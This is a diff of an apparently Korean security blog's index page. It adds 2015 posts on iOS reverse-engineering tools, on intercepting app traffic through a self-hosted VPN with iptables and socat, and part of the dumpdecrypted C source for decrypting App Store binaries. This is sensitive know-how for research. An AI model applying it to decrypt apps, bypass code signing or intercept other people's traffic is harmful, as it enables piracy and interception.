@@ -9,9 +9,22 @@
   <meta name="author" content="KC">
 
   
-  <meta name="description" content="HackingTeam 이 사용하는 exploits framaroot
-towelroot
-putuser Gingerbreak The vulnerability exploited by Gingerbreak exists in the Volume Manager (vold) on &hellip;">
+  <meta name="description" content="Cydia BigBoss Recommended Tools otool 1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+# Inspect the Objective-C segment to reveal class and method names:
+$ otool - &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -67,6 +80,697 @@ putuser Gingerbreak The vulnerability exploited by Gingerbreak exists in the Vol
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/06/04/ios-building-a-basic-toolkit/">iOS: Building a Basic Toolkit</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-06-04T13:23:03+09:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>4</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>1:23 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><h4>Cydia</h4>
+
+<h4>BigBoss Recommended Tools</h4>
+
+<h4>otool</h4>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'># Inspect the Objective-C segment to reveal class and method names:
+</span><span class='line'>$ otool -oV MAHHApp
+</span><span class='line'>
+</span><span class='line'># List the libraries used by the binary:
+</span><span class='line'>$ otool -L MAHHApp
+</span><span class='line'>
+</span><span class='line'># List the symbols exported by a binary
+</span><span class='line'>$ otool -IV MAHHApp
+</span><span class='line'>
+</span><span class='line'># Display the short-form header information:
+</span><span class='line'>$ otool -hV MAHHApp
+</span><span class='line'>
+</span><span class='line'># Display the binary load commands:
+</span><span class='line'>$ otool -l MAHHApp</span></code></pre></td></tr></table></div></figure>
+
+
+<h4>nm</h4>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ nm MAHHApp</span></code></pre></td></tr></table></div></figure>
+
+
+<h4>lipo</h4>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ lipo -info MAHHApp
+</span><span class='line'>$ lipo -thin &lt;arch_type&gt; -output MAHHApp-v7 MAHHApp</span></code></pre></td></tr></table></div></figure>
+
+
+<h4>Debuggers</h4>
+
+<ul>
+<li>gdb (Help: <a href="http://www.pod2g.org/2012/02/working-gnu-debugger-on-ios-43.html">here</a></li>
+<li>radare (Add cydia repo as a source, <a href="http://cydia.radare.org">http://cydia.radare.org</a>)</li>
+</ul>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ lipo -thin armv7 gdb-arm-apple-darwin -output gdb-arm7</span></code></pre></td></tr></table></div></figure>
+
+
+<h4>Tools for Signing Binaries</h4>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'># To sign or replace an existing signature, use the following command:
+</span><span class='line'>$ codesign -v -fs "CodeSignIdentity" MAHHApp.app/
+</span><span class='line'>
+</span><span class='line'># To display the code signature of an application:
+</span><span class='line'>$ codesign -v -d MAHHApp.app</span></code></pre></td></tr></table></div></figure>
+
+
+<ul>
+<li>saurik&rsquo;s ldid: <a href="http://www.saurik.com/id/8">here</a></li>
+</ul>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ ldid -S MAHHApp</span></code></pre></td></tr></table></div></figure>
+
+
+<h4>Installipa</h4>
+
+<ul>
+<li><a href="https://github.com/autopear/ipainstaller">here</a></li>
+<li>AppSync (repo: <a href="http://cydia.appaddict.org">http://cydia.appaddict.org</a>)</li>
+</ul>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'># ipainstaller Lab1.1a.ipa
+</span><span class='line'>Analyzing Lab1.1a.ipa...
+</span><span class='line'>Installing lab1.1a (v1.0)...
+</span><span class='line'>Installed lab1.1a (v1.0) successfully.</span></code></pre></td></tr></table></div></figure>
+
+
+<h4>Exploring the Filesystem</h4>
+
+<ul>
+<li><a href="http://2013.hackitoergosum.org/presentations/Day3-04.Hacking%20apple%20accessories%20to%20pown%20iDevices%20%E2%80%93%20Wake%20up%20Neo!%20Your%20phone%20got%20pwnd%20!%20by%20Mathieu%20GoToHack%20RENARD.pdf">Mathieu Renard</a></li>
+<li>iExplorer</li>
+<li>iFunBox</li>
+</ul>
+
+
+<h4>Property Lists</h4>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'># plutil com.google.Authenticator.plist
+</span><span class='line'>$ plutil -convert xml1 com.google.Authenticator.plist
+</span><span class='line'>$ plutil -convert binary1 com.google.Authenticator.plist</span></code></pre></td></tr></table></div></figure>
+
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/06/02/setting-up-an-intercepting-proxy-on-linux/">Setting Up an Intercepting Proxy on Linux</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-06-02T00:25:15+09:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>2</span><span class='date-suffix'>nd</span>, <span class='date-year'>2015</span></span> <span class='time'>12:25 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>iPhone VPN 설정을 해서, 앱 트래픽을 VPN 서버로 돌리고, VPN 서버에서 트래픽을 까본다음에, 원래 목적지로 릴레이해주는 테크닉.</p>
+
+<h3>Box</h3>
+
+<p>우선 DigitalOcean 에 Ubuntu box 를 하나 만든다.</p>
+
+<h3>PPTP</h3>
+
+<p>이제 Ubuntu 박스에 VPN 서버를 설치해야 한다.</p>
+
+<p><a href="https://www.digitalocean.com/community/tutorials/how-to-setup-your-own-vpn-with-pptp">How To Setup Your Own VPN With PPTP</a></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>sudo apt-get install pptpd
+</span><span class='line'>
+</span><span class='line'>/etc/pptpd.conf
+</span><span class='line'>localip 10.0.0.1
+</span><span class='line'>remoteip 10.0.0.100-200
+</span><span class='line'>
+</span><span class='line'>/etc/ppp/chap-secrets
+</span><span class='line'>box1 pptpd kkkkkkkk
+</span><span class='line'>
+</span><span class='line'>/etc/ppp/pptpd-options
+</span><span class='line'>ms-dns 8.8.8.8
+</span><span class='line'>ms-dns 8.8.4.4
+</span><span class='line'>
+</span><span class='line'>service pptpd restart
+</span><span class='line'>
+</span><span class='line'>netstat -alpn | grep :1723
+</span><span class='line'>
+</span><span class='line'>/etc/sysctl.conf
+</span><span class='line'>net.ipv4.ip_forward = 1
+</span><span class='line'>
+</span><span class='line'>sysctl -p</span></code></pre></td></tr></table></div></figure>
+
+
+<h3>iptables</h3>
+
+<p>NAT 룰 셋업을 해주고, 특정 포트로 향하는 트래픽만 리다이렉트한다.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE && iptables-save
+</span><span class='line'>
+</span><span class='line'>iptables -t nat -A PREROUTING -i ppp+ -p tcp -d 1.2.3.4 --dport 25201 -j REDIRECT --to-port 9999</span></code></pre></td></tr></table></div></figure>
+
+
+<h3>socat</h3>
+
+<p>인터셉트된 트래픽을 덤프하고, 원래 호스트로 릴레이해준다.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>socat -v TCP-LISTEN:9999,fork TCP:1.2.3.4:25201
+</span><span class='line'>
+</span><span class='line'>tshark -i ppp0</span></code></pre></td></tr></table></div></figure>
+
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/06/01/ios-app-automating-the-decryption-process/">iOS App: Automating the Decryption Process</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-06-01T15:15:35+09:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>1</span><span class='date-suffix'>st</span>, <span class='date-year'>2015</span></span> <span class='time'>3:15 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p><a href="https://github.com/stefanesser/dumpdecrypted">dumpdecryted</a></p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+<span class='line-number'>73</span>
+<span class='line-number'>74</span>
+<span class='line-number'>75</span>
+<span class='line-number'>76</span>
+<span class='line-number'>77</span>
+<span class='line-number'>78</span>
+<span class='line-number'>79</span>
+<span class='line-number'>80</span>
+<span class='line-number'>81</span>
+<span class='line-number'>82</span>
+<span class='line-number'>83</span>
+<span class='line-number'>84</span>
+<span class='line-number'>85</span>
+<span class='line-number'>86</span>
+<span class='line-number'>87</span>
+<span class='line-number'>88</span>
+<span class='line-number'>89</span>
+<span class='line-number'>90</span>
+<span class='line-number'>91</span>
+<span class='line-number'>92</span>
+<span class='line-number'>93</span>
+<span class='line-number'>94</span>
+<span class='line-number'>95</span>
+<span class='line-number'>96</span>
+<span class='line-number'>97</span>
+<span class='line-number'>98</span>
+<span class='line-number'>99</span>
+<span class='line-number'>100</span>
+<span class='line-number'>101</span>
+<span class='line-number'>102</span>
+<span class='line-number'>103</span>
+<span class='line-number'>104</span>
+<span class='line-number'>105</span>
+<span class='line-number'>106</span>
+<span class='line-number'>107</span>
+<span class='line-number'>108</span>
+<span class='line-number'>109</span>
+<span class='line-number'>110</span>
+<span class='line-number'>111</span>
+<span class='line-number'>112</span>
+<span class='line-number'>113</span>
+<span class='line-number'>114</span>
+<span class='line-number'>115</span>
+<span class='line-number'>116</span>
+<span class='line-number'>117</span>
+<span class='line-number'>118</span>
+<span class='line-number'>119</span>
+<span class='line-number'>120</span>
+<span class='line-number'>121</span>
+<span class='line-number'>122</span>
+<span class='line-number'>123</span>
+<span class='line-number'>124</span>
+<span class='line-number'>125</span>
+<span class='line-number'>126</span>
+<span class='line-number'>127</span>
+<span class='line-number'>128</span>
+<span class='line-number'>129</span>
+<span class='line-number'>130</span>
+<span class='line-number'>131</span>
+<span class='line-number'>132</span>
+<span class='line-number'>133</span>
+<span class='line-number'>134</span>
+<span class='line-number'>135</span>
+<span class='line-number'>136</span>
+<span class='line-number'>137</span>
+<span class='line-number'>138</span>
+<span class='line-number'>139</span>
+<span class='line-number'>140</span>
+<span class='line-number'>141</span>
+<span class='line-number'>142</span>
+<span class='line-number'>143</span>
+<span class='line-number'>144</span>
+<span class='line-number'>145</span>
+<span class='line-number'>146</span>
+<span class='line-number'>147</span>
+<span class='line-number'>148</span>
+<span class='line-number'>149</span>
+<span class='line-number'>150</span>
+<span class='line-number'>151</span>
+<span class='line-number'>152</span>
+<span class='line-number'>153</span>
+<span class='line-number'>154</span>
+<span class='line-number'>155</span>
+<span class='line-number'>156</span>
+<span class='line-number'>157</span>
+<span class='line-number'>158</span>
+<span class='line-number'>159</span>
+<span class='line-number'>160</span>
+<span class='line-number'>161</span>
+<span class='line-number'>162</span>
+<span class='line-number'>163</span>
+<span class='line-number'>164</span>
+<span class='line-number'>165</span>
+<span class='line-number'>166</span>
+<span class='line-number'>167</span>
+<span class='line-number'>168</span>
+<span class='line-number'>169</span>
+<span class='line-number'>170</span>
+<span class='line-number'>171</span>
+<span class='line-number'>172</span>
+<span class='line-number'>173</span>
+<span class='line-number'>174</span>
+<span class='line-number'>175</span>
+<span class='line-number'>176</span>
+<span class='line-number'>177</span>
+<span class='line-number'>178</span>
+<span class='line-number'>179</span>
+<span class='line-number'>180</span>
+<span class='line-number'>181</span>
+<span class='line-number'>182</span>
+<span class='line-number'>183</span>
+<span class='line-number'>184</span>
+<span class='line-number'>185</span>
+<span class='line-number'>186</span>
+<span class='line-number'>187</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;fcntl.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;mach-o/fat.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;mach-o/loader.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">struct</span> <span class="n">ProgramVars</span> <span class="p">{</span>
+</span><span class='line'>    <span class="k">struct</span> <span class="n">mach_header</span><span class="o">*</span> <span class="n">mh</span><span class="p">;</span>
+</span><span class='line'>    <span class="kt">int</span><span class="o">*</span> <span class="n">NXArgcPtr</span><span class="p">;</span>
+</span><span class='line'>    <span class="k">const</span> <span class="kt">char</span><span class="o">***</span> <span class="n">NXArgvPtr</span><span class="p">;</span>
+</span><span class='line'>    <span class="k">const</span> <span class="kt">char</span><span class="o">***</span> <span class="n">environPtr</span><span class="p">;</span>
+</span><span class='line'>    <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span> <span class="n">__prognamePtr</span><span class="p">;</span>
+</span><span class='line'><span class="p">};</span>
+</span><span class='line'>
+</span><span class='line'><span class="cp">#define swap32(value) (((value&amp;0xFF000000) &gt;&gt; 24) | ((value &amp; 0x00FF0000) &gt;&gt; 8) | ((value &amp; 0x0000FF00) &lt;&lt; 8) | ((value &amp; 0x000000FF) &lt;&lt; 24))</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">__attribute__</span><span class="p">((</span><span class="n">constructor</span><span class="p">))</span>
+</span><span class='line'><span class="kt">void</span> <span class="n">dumptofile</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">apple</span><span class="p">,</span> <span class="k">struct</span> <span class="n">ProgramVars</span> <span class="o">*</span><span class="n">pvars</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>    <span class="k">struct</span> <span class="n">load_command</span> <span class="o">*</span><span class="n">lc</span><span class="p">;</span>
+</span><span class='line'>    <span class="k">struct</span> <span class="n">encryption_info_command</span> <span class="o">*</span><span class="n">eic</span><span class="p">;</span>
+</span><span class='line'>    <span class="k">struct</span> <span class="n">fat_header</span> <span class="o">*</span><span class="n">fh</span><span class="p">;</span>
+</span><span class='line'>    <span class="k">struct</span> <span class="n">fat_arch</span> <span class="o">*</span><span class="n">arch</span><span class="p">;</span>
+</span><span class='line'>    <span class="k">struct</span> <span class="n">mach_header</span> <span class="o">*</span><span class="n">mh</span><span class="p">;</span>
+</span><span class='line'>    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
+</span><span class='line'>    <span class="kt">char</span> <span class="n">rpath</span><span class="p">[</span><span class="mi">4096</span><span class="p">],</span><span class="n">npath</span><span class="p">[</span><span class="mi">4096</span><span class="p">];</span>
+</span><span class='line'>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">fileoffs</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="n">off_cryptid</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="n">restsize</span><span class="p">;</span>
+</span><span class='line'>    <span class="kt">int</span> <span class="n">i</span><span class="p">,</span><span class="n">fd</span><span class="p">,</span><span class="n">outfd</span><span class="p">,</span><span class="n">r</span><span class="p">,</span><span class="n">n</span><span class="p">,</span><span class="n">toread</span><span class="p">;</span>
+</span><span class='line'>    <span class="kt">char</span> <span class="o">*</span><span class="n">tmp</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;mach-o decryption dumper</span><span class="se">\n\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;DISCLAIMER: This tool is only meant for security research purposes, not for application crackers.</span><span class="se">\n\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">pvars</span><span class="o">-&gt;</span><span class="n">mh</span><span class="o">-&gt;</span><span class="n">magic</span> <span class="o">==</span> <span class="n">MH_MAGIC_64</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>        <span class="n">lc</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">load_command</span> <span class="o">*</span><span class="p">)((</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">pvars</span><span class="o">-&gt;</span><span class="n">mh</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">mach_header_64</span><span class="p">));</span>
+</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] detected 64bit ARM binary in memory.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span><span class='line'>        <span class="n">lc</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">load_command</span> <span class="o">*</span><span class="p">)((</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">pvars</span><span class="o">-&gt;</span><span class="n">mh</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">mach_header</span><span class="p">));</span>
+</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] detected 32bit ARM binary in memory.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="k">for</span> <span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">pvars</span><span class="o">-&gt;</span><span class="n">mh</span><span class="o">-&gt;</span><span class="n">ncmds</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>        <span class="k">if</span> <span class="p">(</span><span class="n">lc</span><span class="o">-&gt;</span><span class="n">cmd</span> <span class="o">==</span> <span class="n">LC_ENCRYPTION_INFO</span> <span class="o">||</span> <span class="n">lc</span><span class="o">-&gt;</span><span class="n">cmd</span> <span class="o">==</span> <span class="n">LC_ENCRYPTION_INFO_64</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>            <span class="n">eic</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">encryption_info_command</span> <span class="o">*</span><span class="p">)</span><span class="n">lc</span><span class="p">;</span>
+</span><span class='line'>            <span class="k">if</span> <span class="p">(</span><span class="n">eic</span><span class="o">-&gt;</span><span class="n">cryptid</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+</span><span class='line'>                <span class="k">break</span><span class="p">;</span>
+</span><span class='line'>            <span class="n">off_cryptid</span><span class="o">=</span><span class="p">(</span><span class="kt">off_t</span><span class="p">)((</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">eic</span><span class="o">-&gt;</span><span class="n">cryptid</span><span class="o">-</span><span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">pvars</span><span class="o">-&gt;</span><span class="n">mh</span><span class="p">);</span>
+</span><span class='line'>            <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] offset to cryptid found: @%p(from %p) = %x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">eic</span><span class="o">-&gt;</span><span class="n">cryptid</span><span class="p">,</span> <span class="n">pvars</span><span class="o">-&gt;</span><span class="n">mh</span><span class="p">,</span> <span class="n">off_cryptid</span><span class="p">);</span>
+</span><span class='line'>            <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] Found encrypted data at address %08x of length %u bytes - type %u.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">eic</span><span class="o">-&gt;</span><span class="n">cryptoff</span><span class="p">,</span> <span class="n">eic</span><span class="o">-&gt;</span><span class="n">cryptsize</span><span class="p">,</span> <span class="n">eic</span><span class="o">-&gt;</span><span class="n">cryptid</span><span class="p">);</span>
+</span><span class='line'>            <span class="k">if</span> <span class="p">(</span><span class="n">realpath</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">rpath</span><span class="p">)</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
+</span><span class='line'>                <span class="n">strlcpy</span><span class="p">(</span><span class="n">rpath</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">rpath</span><span class="p">));</span>
+</span><span class='line'>            <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] Opening %s for reading.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">rpath</span><span class="p">);</span>
+</span><span class='line'>            <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">rpath</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
+</span><span class='line'>            <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>                <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[-] Failed opening.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>                <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span><span class='line'>            <span class="p">}</span>
+</span><span class='line'>            <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] Reading header</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>            <span class="n">n</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">));</span>
+</span><span class='line'>            <span class="k">if</span> <span class="p">(</span><span class="n">n</span><span class="o">!=</span><span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">))</span> <span class="p">{</span>
+</span><span class='line'>                <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[W] Warning read only %d bytes</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">n</span><span class="p">);</span>
+</span><span class='line'>            <span class="p">}</span>
+</span><span class='line'>            <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] Detecting header type</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>            <span class="n">fh</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">fat_header</span> <span class="o">*</span><span class="p">)</span><span class="n">buffer</span><span class="p">;</span>
+</span><span class='line'>            <span class="k">if</span> <span class="p">(</span><span class="n">fh</span><span class="o">-&gt;</span><span class="n">magic</span> <span class="o">==</span> <span class="n">FAT_CIGAM</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>                <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] Executable is a FAT image - searching for right architecture</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>                <span class="n">arch</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">fat_arch</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">fh</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+</span><span class='line'>                <span class="k">for</span> <span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">swap32</span><span class="p">(</span><span class="n">fh</span><span class="o">-&gt;</span><span class="n">nfat_arch</span><span class="p">);</span><span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>                    <span class="k">if</span> <span class="p">((</span><span class="n">pvars</span><span class="o">-&gt;</span><span class="n">mh</span><span class="o">-&gt;</span><span class="n">cputype</span> <span class="o">==</span> <span class="n">swap32</span><span class="p">(</span><span class="n">arch</span><span class="o">-&gt;</span><span class="n">cputype</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">pvars</span><span class="o">-&gt;</span><span class="n">mh</span><span class="o">-&gt;</span><span class="n">cpusubtype</span> <span class="o">==</span> <span class="n">swap32</span><span class="p">(</span><span class="n">arch</span><span class="o">-&gt;</span><span class="n">cpusubtype</span><span class="p">)))</span> <span class="p">{</span>
